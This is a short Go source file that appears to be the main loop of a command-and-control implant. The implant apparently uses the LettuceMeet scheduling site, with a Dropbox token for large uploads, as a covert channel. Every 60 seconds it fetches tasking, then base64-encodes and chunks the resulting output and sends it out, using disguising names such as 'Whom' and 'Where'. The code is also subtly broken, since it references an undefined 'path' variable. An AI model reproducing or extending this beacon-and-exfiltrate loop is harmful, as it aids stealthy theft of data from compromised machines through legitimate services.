package cmd

import (
	"LettuceMeet/internal/lettucer"
	"LettuceMeet/utils"
	"encoding/base64"
	"strings"
	"time"
)

var (
	Path  = ""                                                                                                                                              // lettuceMeet path segment
	Whom  = "" // Dropbox token
	Where = "/files.txt"                                                                                                                                         // where large output is uploaded
)

func LettuceMeetDotCom() {
	for {
		msg, err := lettucer.LettuceSee(Path, Whom, Where)
		if err != nil {
			msg = err.Error()
		}
		msg = strings.TrimSpace(msg)

		encodedMsg := base64.StdEncoding.EncodeToString([]byte(msg))
		chunks := utils.LettuceChunk(encodedMsg)

		for _, chunk := range chunks {
			_, _ = lettucer.LettuceGreet(path, chunk)
		}
		time.Sleep(60 * time.Second)
	}
}
